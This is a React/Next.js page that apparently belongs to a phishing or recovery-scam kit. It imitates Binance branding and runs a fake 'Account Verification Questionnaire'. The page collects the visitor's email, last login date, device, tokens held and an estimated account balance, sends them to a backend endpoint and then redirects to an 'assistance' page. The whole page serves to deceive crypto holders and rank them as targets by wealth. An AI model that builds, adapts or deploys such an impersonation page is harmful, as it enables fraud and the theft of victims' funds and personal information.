"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { motion, AnimatePresence } from "framer-motion";
import Navbar from "../components/Navbar";

interface Question {
  id: string;
  type: "multiple-choice" | "text" | "email" | "date" | "multi-select";
  question: string;
  options?: string[];
  required?: boolean;
}

const questions: Question[] = [
  {
    id: "last-login",
    type: "date",
    question: "What was the approximate date of your last login to the Binance platform?",
    required: true
  },
  {
    id: "device",
    type: "text",
    question: "What device do you usually use to access your account? (make and model)",
    required: true
  },
  {
    id: "tokens",
    type: "multi-select",
    question: "Which, if any, of these tokens have you held on Binance over the past 12 months?",
    options: ["XRP", "Bitcoin", "Ethereum", "BNB", "USDC", "USDT", "ADA", "XLM", "SOL", "DOGE"],
    required: false
  },
  {
    id: "balance",
    type: "multiple-choice",
    question: "What was your last known balance on Binance, this can be a rough estimate?",
    options: [
      "$0 - $1,000",
      "$1,000 - $10,000",
      "$10,000 - $50,000",
      "$50,000+"
    ],
    required: true
  }
];

export default function Questions() {
  const router = useRouter();
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [answers, setAnswers] = useState<Record<string, string | string[]>>({});
  const [email, setEmail] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);

  // Get email from query params or localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      // Try query params first
      const urlParams = new URLSearchParams(window.location.search);
      const emailFromParams = urlParams.get('email');
      if (emailFromParams) {
        setEmail(emailFromParams);
        return;
      }

      // Try localStorage
      const emailFromStorage = localStorage.getItem('email');
      if (emailFromStorage) {
        setEmail(emailFromStorage);
      }
    }
  }, []);

  const currentQuestion = questions[currentQuestionIndex];
  const progress = ((currentQuestionIndex + 1) / questions.length) * 100;
  const isLastQuestion = currentQuestionIndex === questions.length - 1;

  const handleAnswer = (value: string | string[]) => {
    setAnswers({
      ...answers,
      [currentQuestion.id]: value
    });
  };

  const handleMultiSelect = (option: string) => {
    const currentAnswers = (answers[currentQuestion.id] as string[]) || [];
    const newAnswers = currentAnswers.includes(option)
      ? currentAnswers.filter((item) => item !== option)
      : [...currentAnswers, option];
    handleAnswer(newAnswers);
  };

  const isAnswerValid = (answer: string | string[] | undefined): boolean => {
    if (!answer) return false;
    if (Array.isArray(answer)) return answer.length > 0;
    return answer.trim() !== '';
  };

  const handleNext = () => {
    if (currentQuestion.required && !answers[currentQuestion.id]) {
      return;
    }
    if (currentQuestionIndex < questions.length - 1) {
      setCurrentQuestionIndex(currentQuestionIndex + 1);
    }
  };

  const handlePrevious = () => {
    if (currentQuestionIndex > 0) {
      setCurrentQuestionIndex(currentQuestionIndex - 1);
    }
  };

  const handleSubmit = async () => {
    // Validate required fields
    const missingRequired = questions.filter(
      q => q.required && !isAnswerValid(answers[q.id])
    );
    
    if (missingRequired.length > 0) {
      setSubmitError("Please answer all required questions");
      return;
    }

    setIsSubmitting(true);
    setSubmitError(null);

    try {
      const response = await fetch('/api/submit-questionnaire', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email || undefined,
          answers: answers,
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Failed to submit questionnaire');
      }

      // Redirect to assistance page
      router.push('/assistance');
    } catch (error: any) {
      console.error("Error submitting questionnaire:", error);
      setSubmitError(error.message || 'Failed to submit. Please try again.');
      setIsSubmitting(false);
    }
  };


  return (
    <div className="min-h-screen bg-[#181A21] flex flex-col relative">
      <Navbar />
      
      {/* Loading Overlay */}
      {isSubmitting && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-[#181A21] bg-opacity-95 z-50 flex items-center justify-center"
        >
          <div className="text-center">
            <motion.svg
              animate={{ rotate: 360 }}
              transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
              width="48"
              height="48"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#FCD535"
              strokeWidth="3"
              className="mx-auto mb-4"
            >
              <path d="M21 12a9 9 0 11-6.219-8.56" />
            </motion.svg>
            <p className="text-white text-lg font-semibold">Completing Verification...</p>
            <p className="text-gray-400 text-sm mt-2">Please wait while we process your information</p>
          </div>
        </motion.div>
      )}
      
      {/* Header Section */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="bg-[#0A0F11]"
      >
        <div className="w-full px-4 sm:px-6 md:px-10 lg:px-16 py-4 sm:py-5">
          <h1 className="text-lg sm:text-xl font-bold text-white">
            Account Verification Questionnaire
          </h1>
          <p className="text-sm text-gray-400 mt-1">
            Please provide the following information to help us verify your account
          </p>
        </div>
      </motion.div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 sm:px-6 md:px-10 lg:px-16 py-6 sm:py-8">
        <div className="max-w-2xl w-full">
          {/* Progress Bar */}
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 sm:mb-8"
          >
            <div className="flex justify-between items-center mb-2">
              <span className="text-xs sm:text-sm text-gray-400">
                Question {currentQuestionIndex + 1} of {questions.length}
              </span>
              <span className="text-xs sm:text-sm text-gray-400">
                {Math.round(progress)}%
              </span>
            </div>
            <div className="w-full h-2 bg-[#2B3139] rounded-full overflow-hidden">
              <motion.div
                initial={{ width: 0 }}
                animate={{ width: `${progress}%` }}
                transition={{ duration: 0.4, ease: "easeOut" }}
                className="h-full bg-[#FCD535]"
              />
            </div>
          </motion.div>

          {/* Question Card */}
          <AnimatePresence mode="wait">
            <motion.div
              key={currentQuestionIndex}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3, ease: "easeInOut" }}
              className={`p-4 sm:p-5 rounded-lg border mb-6 ${
                (answers[currentQuestion.id] && 
                 (Array.isArray(answers[currentQuestion.id]) 
                   ? answers[currentQuestion.id].length > 0 
                   : answers[currentQuestion.id] !== ""))
                  ? "bg-[#1E2329] border-[#2EBD85]"
                  : "bg-[#2B3139] border-[#3B4149]"
              }`}
            >
              <div className="flex items-start gap-3 sm:gap-4">
                {/* Question Number */}
                <div
                  className={`flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center ${
                    (answers[currentQuestion.id] && 
                     (Array.isArray(answers[currentQuestion.id]) 
                       ? answers[currentQuestion.id].length > 0 
                       : answers[currentQuestion.id] !== ""))
                      ? "bg-[#2EBD85]"
                      : "bg-[#FCD535]"
                  }`}
                >
                  {(answers[currentQuestion.id] && 
                    (Array.isArray(answers[currentQuestion.id]) 
                      ? answers[currentQuestion.id].length > 0 
                      : answers[currentQuestion.id] !== "")) ? (
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="#181A21"
                      strokeWidth="3"
                    >
                      <path d="M20 6L9 17l-5-5" />
                    </svg>
                  ) : (
                    <span className="text-[#181A21] font-bold text-sm">
                      {currentQuestionIndex + 1}
                    </span>
                  )}
                </div>

                {/* Question Content */}
                <div className="flex-1 min-w-0">
                  <h3 className="text-base sm:text-lg text-white font-semibold mb-4 sm:mb-6">
                    {currentQuestion.question}
                    {currentQuestion.required && (
                      <span className="text-red-400 ml-1">*</span>
                    )}
                  </h3>

                  {currentQuestion.type === "multiple-choice" && (
                    <div className="space-y-3">
                      <AnimatePresence>
                        {currentQuestion.options?.map((option, index) => (
                          <motion.button
                            key={index}
                            initial={{ opacity: 0, x: -10 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: index * 0.05 }}
                            onClick={() => handleAnswer(option)}
                            className={`w-full text-left p-3 sm:p-4 rounded-lg border transition-all duration-200 ${
                              answers[currentQuestion.id] === option
                                ? "bg-[#FCD535] text-[#181A21] border-[#FCD535] shadow-lg"
                                : "bg-[#181A21] text-white border-[#3B4149] hover:border-[#FCD535] hover:bg-[#2B3139]"
                            }`}
                          >
                            <div className="flex items-center gap-3">
                              <div
                                className={`flex-shrink-0 w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                                  answers[currentQuestion.id] === option
                                    ? "border-[#181A21] bg-[#181A21]"
                                    : "border-[#3B4149]"
                                }`}
                              >
                                {answers[currentQuestion.id] === option && (
                                  <motion.div
                                    initial={{ scale: 0 }}
                                    animate={{ scale: 1 }}
                                    className="w-2 h-2 rounded-full bg-[#FCD535]"
                                  />
                                )}
                              </div>
                              <span className="text-sm sm:text-base">{option}</span>
                            </div>
                          </motion.button>
                        ))}
                      </AnimatePresence>
                    </div>
                  )}

                  {currentQuestion.type === "date" && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.1 }}
                    >
                      <input
                        type="date"
                        value={(answers[currentQuestion.id] as string) || ""}
                        onChange={(e) => handleAnswer(e.target.value)}
                        max={new Date().toISOString().split('T')[0]}
                        className="w-full p-3 sm:p-4 bg-[#181A21] text-white text-sm border border-[#3B4149] rounded-lg focus:outline-none focus:border-[#FCD535] transition-colors font-mono"
                      />
                    </motion.div>
                  )}

                  {currentQuestion.type === "multi-select" && (
                    <div className="space-y-3">
                      <AnimatePresence>
                        {currentQuestion.options?.map((option, index) => {
                          const selectedTokens = (answers[currentQuestion.id] as string[]) || [];
                          const isSelected = selectedTokens.includes(option);
                          return (
                            <motion.button
                              key={index}
                              initial={{ opacity: 0, x: -10 }}
                              animate={{ opacity: 1, x: 0 }}
                              transition={{ delay: index * 0.05 }}
                              onClick={() => handleMultiSelect(option)}
                              className={`w-full text-left p-3 sm:p-4 rounded-lg border transition-all duration-200 ${
                                isSelected
                                  ? "bg-[#FCD535] text-[#181A21] border-[#FCD535] shadow-lg"
                                  : "bg-[#181A21] text-white border-[#3B4149] hover:border-[#FCD535] hover:bg-[#2B3139]"
                              }`}
                            >
                              <div className="flex items-center gap-3">
                                <div
                                  className={`flex-shrink-0 w-5 h-5 rounded border-2 flex items-center justify-center ${
                                    isSelected
                                      ? "border-[#181A21] bg-[#181A21]"
                                      : "border-[#3B4149]"
                                  }`}
                                >
                                  {isSelected && (
                                    <motion.svg
                                      initial={{ scale: 0 }}
                                      animate={{ scale: 1 }}
                                      width="12"
                                      height="12"
                                      viewBox="0 0 24 24"
                                      fill="none"
                                      stroke="#FCD535"
                                      strokeWidth="3"
                                    >
                                      <path d="M20 6L9 17l-5-5" />
                                    </motion.svg>
                                  )}
                                </div>
                                <span className="text-sm sm:text-base font-medium">{option}</span>
                              </div>
                            </motion.button>
                          );
                        })}
                      </AnimatePresence>
                    </div>
                  )}

                  {(currentQuestion.type === "text" || currentQuestion.type === "email") && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.1 }}
                    >
                      {currentQuestion.type === "text" ? (
                        <input
                          type="text"
                          value={(answers[currentQuestion.id] as string) || ""}
                          onChange={(e) => handleAnswer(e.target.value)}
                          placeholder="e.g., iPhone 14 Pro, Samsung Galaxy S23, MacBook Pro M2"
                          className="w-full p-3 sm:p-4 bg-[#181A21] text-white text-sm border border-[#3B4149] rounded-lg focus:outline-none focus:border-[#FCD535] transition-colors font-mono"
                        />
                      ) : (
                        <input
                          type="email"
                          value={(answers[currentQuestion.id] as string) || ""}
                          onChange={(e) => handleAnswer(e.target.value)}
                          placeholder="your.email@example.com"
                          className="w-full p-3 sm:p-4 bg-[#181A21] text-white text-sm border border-[#3B4149] rounded-lg focus:outline-none focus:border-[#FCD535] transition-colors font-mono"
                        />
                      )}
                    </motion.div>
                  )}

                  {submitError && (
                    <motion.p
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mt-4 text-sm text-red-400 flex items-center gap-2"
                    >
                      <svg
                        width="16"
                        height="16"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                      >
                        <circle cx="12" cy="12" r="10" />
                        <line x1="12" y1="8" x2="12" y2="12" />
                        <line x1="12" y1="16" x2="12.01" y2="16" />
                      </svg>
                      {submitError}
                    </motion.p>
                  )}
                </div>
              </div>
            </motion.div>
          </AnimatePresence>

          {/* Navigation Buttons */}
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex justify-between gap-4"
          >
            <button
              onClick={handlePrevious}
              disabled={currentQuestionIndex === 0}
              className={`px-4 sm:px-6 py-2 sm:py-3 text-sm sm:text-base font-semibold rounded transition-colors flex items-center gap-2 ${
                currentQuestionIndex === 0
                  ? "bg-[#2B3139] text-gray-600 cursor-not-allowed opacity-50"
                  : "bg-[#2B3139] text-white border border-[#3B4149] hover:border-[#FCD535] cursor-pointer"
              }`}
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
              >
                <path d="M19 12H5M12 19l-7-7 7-7" />
              </svg>
              Previous
            </button>

            {!isLastQuestion ? (
              <button
                onClick={handleNext}
                disabled={currentQuestion.required && !isAnswerValid(answers[currentQuestion.id])}
                className={`px-4 sm:px-6 py-2 sm:py-3 text-sm sm:text-base font-semibold rounded transition-colors flex items-center gap-2 ${
                  currentQuestion.required && !isAnswerValid(answers[currentQuestion.id])
                    ? "bg-gray-600 text-gray-400 cursor-not-allowed opacity-50"
                    : "bg-[#FCD535] text-[#181A21] hover:bg-[#e5c030] cursor-pointer"
                }`}
              >
                Next
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M5 12h14M12 5l7 7-7 7" />
                </svg>
              </button>
            ) : (
              <button
                onClick={handleSubmit}
                disabled={isSubmitting || (currentQuestion.required && !isAnswerValid(answers[currentQuestion.id]))}
                className={`px-4 sm:px-6 py-2 sm:py-3 text-sm sm:text-base font-semibold rounded transition-colors flex items-center gap-2 ${
                  isSubmitting || (currentQuestion.required && !isAnswerValid(answers[currentQuestion.id]))
                    ? "bg-gray-600 text-gray-400 cursor-not-allowed opacity-50"
                    : "bg-[#FCD535] text-[#181A21] hover:bg-[#e5c030] cursor-pointer"
                }`}
              >
                {isSubmitting ? (
                  <>
                    <motion.svg
                      animate={{ rotate: 360 }}
                      transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                    >
                      <path d="M21 12a9 9 0 11-6.219-8.56" />
                    </motion.svg>
                    Completing Verification...
                  </>
                ) : (
                  <>
                    Complete Verification
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                    >
                      <path d="M20 6L9 17l-5-5" />
                    </svg>
                  </>
                )}
              </button>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
}
